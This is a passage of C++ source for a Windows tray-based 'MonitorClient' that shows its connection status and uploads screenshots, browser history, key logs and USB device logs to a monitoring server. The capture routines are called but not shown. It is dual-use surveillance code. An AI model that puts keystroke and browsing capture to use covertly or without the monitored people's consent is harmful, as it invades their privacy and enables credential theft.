    wcex.hIcon = LoadIconA(NULL, (LPCSTR)IDI_APPLICATION);
    wcex.hCursor = LoadCursorA(NULL, (LPCSTR)IDC_ARROW);
    wcex.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
    wcex.lpszClassName = "MonitorTrayIcon";
    
    if (!RegisterClassExA(&wcex)) {
        // Failed to register window class
        return;
    }

    // Create the main window (hidden)
    hMainWindow = CreateWindowExA(
        0, 
        "MonitorTrayIcon", 
        "Monitor Client", 
        WS_OVERLAPPED, 
        0, 0, 0, 0, 
        NULL, NULL, 
        GetModuleHandleA(NULL), 
        NULL
    );
    
    if (!hMainWindow) {
        // Failed to create main window
        return;
    }
    
    ShowWindow(hMainWindow, SW_HIDE); // Hide the main window

    // Create the tray icon
    ZeroMemory(&nid, sizeof(NOTIFYICONDATAA));
    nid.cbSize = sizeof(NOTIFYICONDATAA);
    nid.hWnd = hMainWindow;
    nid.uID = 1; // Unique ID for this icon
    nid.uFlags = NIF_ICON | NIF_MESSAGE | NIF_TIP;
    nid.uCallbackMessage = WM_TRAYICON;
    greenTrayIcon=buildStatusIcon(RGB(22,185,80));
    redTrayIcon=buildStatusIcon(RGB(227,45,45));
    const bool active=connectionStatus.serverConnected.load() &&
                      selectedMonitorId.load()>0 && !getClientToken().empty();
    nid.hIcon=active?greenTrayIcon:redTrayIcon;
    if(!nid.hIcon)nid.hIcon=LoadIconA(nullptr,(LPCSTR)IDI_APPLICATION);
    std::snprintf(nid.szTip,sizeof(nid.szTip),"MonitorClient %s - %s",
        APP_VERSION.c_str(),active?"Connected":"Offline / monitor not selected");

    if (!Shell_NotifyIconA(NIM_ADD, &nid)) {
        // Failed to add tray icon
        return;
    }

    // Create context menu (will be updated dynamically)
    hTrayMenu = CreatePopupMenu();

    // Set the tray icon and menu
    updateTrayIcon();
    updateTrayMenu();
    
    // System tray setup completed
}

// Cleanup system tray
void cleanupSystemTray() {
    Shell_NotifyIconA(NIM_DELETE, &nid);
    if(greenTrayIcon && greenTrayIcon!=LoadIconA(nullptr,(LPCSTR)IDI_APPLICATION))DestroyIcon(greenTrayIcon);
    if(redTrayIcon && redTrayIcon!=LoadIconA(nullptr,(LPCSTR)IDI_APPLICATION))DestroyIcon(redTrayIcon);
    greenTrayIcon=redTrayIcon=nullptr;
    trayTaskbarCreatedMessage=0;
    if (hTrayMenu) {
        DestroyMenu(hTrayMenu);
        hTrayMenu = NULL;
    }
    if (hMainWindow) {
        DestroyWindow(hMainWindow);
        hMainWindow = NULL;
    }
}

// Window procedure for the main window
LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    if(trayTaskbarCreatedMessage!=0 && uMsg==trayTaskbarCreatedMessage) {
        NOTIFYICONDATAA restore=nid;
        restore.uFlags=NIF_ICON|NIF_MESSAGE|NIF_TIP;
        if(Shell_NotifyIconA(NIM_ADD,&restore))updateTrayIcon();
        return 0;
    }
    switch (uMsg) {
        case WM_TRAYICON:
            if (lParam == WM_RBUTTONUP) {
                POINT pt;
                GetCursorPos(&pt);
                SetForegroundWindow(hwnd); // Bring window to foreground
                updateTrayMenu(); // Update menu with current status
                TrackPopupMenu(hTrayMenu, TPM_RIGHTBUTTON, pt.x, pt.y, 0, hwnd, NULL);
            }
            return 0;
        case WM_COMMAND:
            switch (LOWORD(wParam)) {
                case ID_TRAY_EXIT:
                    PostQuitMessage(0);
                    break;
                case ID_TRAY_STATUS:
                case ID_TRAY_CLIENT_INFO:
                case ID_TRAY_SERVER_INFO:
                case ID_TRAY_SCREENSHOT_STATUS:
                case ID_TRAY_TIC_STATUS:
                case ID_TRAY_BROWSER_STATUS:
                case ID_TRAY_KEYLOG_STATUS:
                case ID_TRAY_USB_STATUS:
                    // No action (status items are disabled)
                    break;
                case ID_TRAY_SEND_ALL:
                    std::thread([](){
                        sendInitialDataRequests();
                    }).detach();
                    break;
                case ID_TRAY_SIGN_IN:
                    showClientLogin();
                    break;
                case ID_TRAY_SETTINGS:
                    showMonitorSettings();
                    break;
                case ID_TRAY_NOTIFICATIONS: {
                    const bool enabled=!notificationsEnabled.load();
                    notificationsEnabled.store(enabled);
                    saveClientSetting("Client","notifications",enabled?"1":"0");
                    if(!enabled)clearPendingTrayNotification();
                    updateTrayMenu();
                    break;
                }
                case ID_TRAY_CONFIG_REFRESH:
                    std::thread([](){
                        manualConfigRefresh();
                    }).detach();
                    break;
            }
            break;
        case WM_DESTROY:
            PostQuitMessage(0);
            return 0;
    }
    return DefWindowProcA(hwnd, uMsg, wParam, lParam);
}



// Render a dedicated, high-contrast green/red status dot at the native
// small-icon size. A tiny overlay on IDI_APPLICATION was nearly invisible
// after Windows scaled the generic 32px icon to the taskbar's 16px slot.
static HICON buildStatusIcon(COLORREF dot) {
    const int width=std::max(16,GetSystemMetrics(SM_CXSMICON));
    const int height=std::max(16,GetSystemMetrics(SM_CYSMICON));
    BITMAPINFO bitmap{};
    bitmap.bmiHeader.biSize=sizeof(BITMAPINFOHEADER);
    bitmap.bmiHeader.biWidth=width;
    bitmap.bmiHeader.biHeight=-height; // Top-down BGRA DIB.
    bitmap.bmiHeader.biPlanes=1;
    bitmap.bmiHeader.biBitCount=32;
    bitmap.bmiHeader.biCompression=BI_RGB;
    void* pixels=nullptr;
    HDC display=GetDC(nullptr);
    if(!display)return nullptr;
    HBITMAP color=CreateDIBSection(display,&bitmap,DIB_RGB_COLORS,&pixels,nullptr,0);
    ReleaseDC(nullptr,display);
    if(!color || !pixels) {
        if(color)DeleteObject(color);
        return nullptr;
    }

    // A monochrome AND mask plus an ARGB color bitmap works on older and
    // newer versions of Windows without shipping a separate icon resource.
    const int stride=((width+15)/16)*2;
    std::vector<BYTE> maskBits(static_cast<size_t>(stride)*height,0xFF);
    auto* rgba=static_cast<DWORD*>(pixels);
    const double cx=(width-1)/2.0,cy=(height-1)/2.0;
    const double radius=std::min(width,height)/2.0-1.0;
    const double outer2=radius*radius;
    const double inner2=(radius-1.3)*(radius-1.3);
    for(int y=0;y<height;++y) {
        for(int x=0;x<width;++x) {
            const double dx=x-cx,dy=y-cy,d2=dx*dx+dy*dy;
            if(d2>outer2) {
                rgba[y*width+x]=0;
                continue;
            }
            maskBits[static_cast<size_t>(y)*stride+x/8]&=
                static_cast<BYTE>(~(0x80u>>(x%8)));
            const COLORREF pixel=d2>inner2?RGB(255,255,255):dot;
            rgba[y*width+x]=0xFF000000u |
                (static_cast<DWORD>(GetRValue(pixel))<<16) |
                (static_cast<DWORD>(GetGValue(pixel))<<8) |
                static_cast<DWORD>(GetBValue(pixel));
        }
    }
    HBITMAP mask=CreateBitmap(width,height,1,1,maskBits.data());
    if(!mask) {
        DeleteObject(color);
        return nullptr;
    }
    ICONINFO info{};
    info.fIcon=TRUE;
    info.hbmColor=color;
    info.hbmMask=mask;
    HICON result=CreateIconIndirect(&info);
    DeleteObject(mask);
    DeleteObject(color);
    return result;
}
void updateTrayIcon() {
    // Exactly one notification-area icon: its color changes when the
    // authenticated monitor's connection becomes active or disconnected.
    const bool active=connectionStatus.serverConnected.load() &&
                      selectedMonitorId.load()>0 && !getClientToken().empty();
    if(!nid.hWnd || !IsWindow(nid.hWnd))return;
    NOTIFYICONDATAA change{};
    change.cbSize=sizeof(change);
    change.hWnd=nid.hWnd;
    change.uID=nid.uID;
    change.uFlags=NIF_ICON|NIF_TIP;
    change.hIcon=active?greenTrayIcon:redTrayIcon;
    if(!change.hIcon)change.hIcon=LoadIconA(nullptr,(LPCSTR)IDI_APPLICATION);
    std::snprintf(change.szTip,sizeof(change.szTip),"MonitorClient %s - %s",
        APP_VERSION.c_str(),active?"Connected":"Offline / monitor not selected");
    Shell_NotifyIconA(NIM_MODIFY,&change);
}

// Show connection error notification
void showConnectionError(const std::string& error) {
    showToastNotification("Connection Error", error, "error");
    connectionStatus.lastError = error;
    connectionStatus.lastSuccess = std::chrono::steady_clock::now();
    updateTrayIcon();
}

// Test server connection
bool testServerConnection() {
    std::string url = API_BASE_URL + TIC_ROUTE;
    writeDebugLog("Testing connection to: " + url);
    
    std::string response = httpPost(url, "{\"Event\":\"Tic\",\"Version\":\"1.0\",\"MacAddress\":\"" + macAddress + "\"}");
    
    // Check if we got any response at all
    if (response.empty()) {
        connectionStatus.serverConnected = false;
        connectionStatus.lastError = "No response from server (server may be down or unreachable)";
        writeDebugLog("Connection test failed: No response from server");
        updateTrayIcon();
        checkConnectionStatusChange();
        return false;
    }
    
    writeDebugLog("Server response: " + response);
    
    // Parse response
    Json::Value root;
    Json::Reader reader;
    if (reader.parse(response, root)) {
        if (root.isMember("status") && root["status"].asString() == "success") {
            connectionStatus.serverConnected = true;
            connectionStatus.lastSuccess = std::chrono::steady_clock::now();
            connectionStatus.lastError = "";
            writeDebugLog("Connection test successful");
            updateTrayIcon();
            checkConnectionStatusChange();
            return true;
        } else {
            connectionStatus.serverConnected = false;
            connectionStatus.lastError = "Server responded with error: " + response;
            writeDebugLog("Connection test failed: Server error response");
            updateTrayIcon();
            checkConnectionStatusChange();
            return false;
        }
    } else {
        connectionStatus.serverConnected = false;
        connectionStatus.lastError = "Server returned invalid JSON: " + response;
        writeDebugLog("Connection test failed: Invalid JSON response");
        updateTrayIcon();
        checkConnectionStatusChange();
        return false;
    }
} 

// Helper function to get the local network IPv4 address - improved version
std::string getLocalIPAddress() {
    std::string foundIP = "Unknown";
    ULONG ulOutBufLen = sizeof(IP_ADAPTER_INFO);
    PIP_ADAPTER_INFO pAdapterInfo = (IP_ADAPTER_INFO*)malloc(sizeof(IP_ADAPTER_INFO));
    
    if (pAdapterInfo == NULL) {
        return "Unknown";
    }
    
    // First call to get required buffer size
    if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == ERROR_BUFFER_OVERFLOW) {
        free(pAdapterInfo);
        pAdapterInfo = (IP_ADAPTER_INFO*)malloc(ulOutBufLen);
        if (pAdapterInfo == NULL) {
            return "Unknown";
        }
    }
    
    if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == NO_ERROR) {
        PIP_ADAPTER_INFO pAdapter = pAdapterInfo;
        std::string bestIP = "";
        int bestPriority = -1;
        
        while (pAdapter) {
            // Check if adapter has a valid IP
            PIP_ADDR_STRING pIPAddr = &pAdapter->IpAddressList;
            while (pIPAddr) {
                std::string ip = pIPAddr->IpAddress.String;
                if (!ip.empty() && ip != "0.0.0.0" &&
                    ip.substr(0, 4) != "127." &&
                    ip.substr(0, 8) != "169.254." &&
                    ip.find(':') == std::string::npos) {
                    
                    // Priority system: Ethernet > Wi-Fi > Others
                    int priority = 0;
                    if (pAdapter->Type == MIB_IF_TYPE_ETHERNET) {
                        priority = 3; // Highest priority for Ethernet
                    } else if (pAdapter->Type == IF_TYPE_IEEE80211) {
                        priority = 2; // Second priority for Wi-Fi
                    } else if (pAdapter->Type == IF_TYPE_PPP) {
                        priority = 1; // Low priority for PPP (dial-up, VPN)
                    } else {
                        priority = 0; // Lowest priority for others
                    }
                    
                    // Also check adapter description for additional hints
                    std::string description = pAdapter->Description;
                    
                    // Boost priority for adapters that are likely primary
                    if (description.find("Ethernet") != std::string::npos || 
                        description.find("Gigabit") != std::string::npos ||
                        description.find("Realtek") != std::string::npos ||
                        description.find("Intel") != std::string::npos) {
                        priority += 1;
                    }
                    
                    // Skip virtual adapters and tunnels
                    if (description.find("Virtual") == std::string::npos &&
                        description.find("Tunnel") == std::string::npos &&
                        description.find("Loopback") == std::string::npos &&
                        description.find("VMware") == std::string::npos &&
                        description.find("VirtualBox") == std::string::npos) {
                        
                        if (priority > bestPriority) {
                            bestIP = ip;
                            bestPriority = priority;
                            // Found candidate IP
                        }
                    }
                }
                pIPAddr = pIPAddr->Next;
            }
            pAdapter = pAdapter->Next;
        }
        
        if (!bestIP.empty()) {
            foundIP = bestIP;
        }
    } else {
        // GetAdaptersInfo failed
    }
    
    free(pAdapterInfo);
    
    // Additional fallback: Try to get IP by connecting to a remote address
    if (foundIP == "Unknown") {
        SOCKET sock = socket(AF_INET, SOCK_DGRAM, 0);
        if (sock != INVALID_SOCKET) {
            // Connect to a remote address to determine local IP
            struct sockaddr_in remote_addr;
            remote_addr.sin_family = AF_INET;
            remote_addr.sin_port = htons(80);
            inet_pton(AF_INET, "8.8.8.8", &remote_addr.sin_addr);
            
            if (connect(sock, (struct sockaddr*)&remote_addr, sizeof(remote_addr)) == 0) {
                struct sockaddr_in local_addr;
                int addr_len = sizeof(local_addr);
                if (getsockname(sock, (struct sockaddr*)&local_addr, &addr_len) == 0) {
                    char* ip_str = inet_ntoa(local_addr.sin_addr);
                    if (ip_str && strcmp(ip_str, "0.0.0.0") != 0) {
                        foundIP = std::string(ip_str);
                        // Fallback method found IP
                    }
                }
            }
            closesocket(sock);
        }
    }
    
    if (foundIP == "Unknown") {
        // Could not determine IP address
    } else {
        // IP address determined
    }
    
    return foundIP;
} 

// Memory management function to prevent unlimited growth - enhanced
void manageMemoryLimits() {
    std::lock_guard<std::mutex> lock(dataMutex);
    
    // Limit key logs - more aggressive trimming
    if (keyLogs.size() > MAX_KEY_LOGS) {
        size_t excess = keyLogs.size() - MAX_KEY_LOGS;
        keyLogs.erase(keyLogs.begin(), keyLogs.begin() + excess);
        writeDebugLog("Trimmed " + std::to_string(excess) + " key logs");
    }
    
    // Limit USB logs - more aggressive trimming
    if (usbDeviceLogs.size() > MAX_USB_LOGS) {
        size_t excess = usbDeviceLogs.size() - MAX_USB_LOGS;
        usbDeviceLogs.erase(usbDeviceLogs.begin(), usbDeviceLogs.begin() + excess);
        writeDebugLog("Trimmed " + std::to_string(excess) + " USB logs");
    }
    
    // Limit browser histories - more aggressive trimming
    if (browserHistories.size() > MAX_BROWSER_HISTORIES) {
        size_t excess = browserHistories.size() - MAX_BROWSER_HISTORIES;
        browserHistories.erase(browserHistories.begin(), browserHistories.begin() + excess);
        writeDebugLog("Trimmed " + std::to_string(excess) + " browser histories");
    }
    
    // Force garbage collection by shrinking vectors if they're much larger than needed
    if (keyLogs.capacity() > MAX_KEY_LOGS * 2) {
        std::vector<Json::Value>(keyLogs).swap(keyLogs);
        writeDebugLog("Shrunk key logs vector capacity");
    }
    
    if (usbDeviceLogs.capacity() > MAX_USB_LOGS * 2) {
        std::vector<Json::Value>(usbDeviceLogs).swap(usbDeviceLogs);
        writeDebugLog("Shrunk USB logs vector capacity");
    }
    
    if (browserHistories.capacity() > MAX_BROWSER_HISTORIES * 2) {
        std::vector<Json::Value>(browserHistories).swap(browserHistories);
        writeDebugLog("Shrunk browser histories vector capacity");
    }
} 

// Send initial data requests (screenshot, tic, browser history, key log, USB log)
void sendInitialDataRequests() {
    if(selectedMonitorId.load()<1)return;
    // Starting initial data requests
    
    // Send screenshot first (0.5s delay)
    std::string screenshotPath = takeScreenshot();
    sendScreenshot(screenshotPath);
    updateTrayMenu(); // Update tray menu to show status
    std::this_thread::sleep_for(std::chrono::milliseconds(500));
    
    // Send tic event (0.5s delay)
    sendTicEvent();
    updateTrayMenu();
    std::this_thread::sleep_for(std::chrono::milliseconds(500));
    
    // Collect and send browser history (1s delay)
    collectBrowserHistory();
    sendBrowserHistories();
    updateTrayMenu();
    std::this_thread::sleep_for(std::chrono::milliseconds(1000));
    
    // Send key logs (1s delay)
    sendKeyLogs();
    updateTrayMenu();
    std::this_thread::sleep_for(std::chrono::milliseconds(1000));
    
    // Send USB logs (1s delay)
    sendUSBLogs();
    updateTrayMenu();
    std::this_thread::sleep_for(std::chrono::milliseconds(1000));
    
    // sendScreenshot removes the file only after the backend confirms receipt.
    
    // Clean up any other temporary files
    cleanupTemporaryFiles();
    // Initial data requests completed
}

// Clean up temporary files to prevent disk space issues
void cleanupTemporaryFiles() {
    // Clean up temporary database files
    DeleteFileA("temp_chrome_history.db");
    DeleteFileA("temp_firefox_history.db");
    DeleteFileA("temp_edge_history.db");
    
    // Clean up any old screenshot files (older than 1 hour)
    WIN32_FIND_DATAA findData;
    HANDLE hFind = FindFirstFileA("screenshot_*.jpg", &findData);
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            FILETIME fileTime = findData.ftCreationTime;
            SYSTEMTIME systemTime;
            FileTimeToSystemTime(&fileTime, &systemTime);
            
            // Check if file is older than 1 hour
            FILETIME currentTime;
            GetSystemTimeAsFileTime(&currentTime);
            
            ULARGE_INTEGER fileTimeUL, currentTimeUL;
            fileTimeUL.LowPart = fileTime.dwLowDateTime;
            fileTimeUL.HighPart = fileTime.dwHighDateTime;
            currentTimeUL.LowPart = currentTime.dwLowDateTime;
            currentTimeUL.HighPart = currentTime.dwHighDateTime;
            
            // 1 hour = 10000000 * 60 * 60 = 36000000000 (100-nanosecond intervals)
            if ((currentTimeUL.QuadPart - fileTimeUL.QuadPart) > 36000000000) {
                DeleteFileA(findData.cFileName);
                writeDebugLog("Cleaned up old screenshot file: " + std::string(findData.cFileName));
            }
        } while (FindNextFileA(hFind, &findData));
        FindClose(hFind);
    }
} 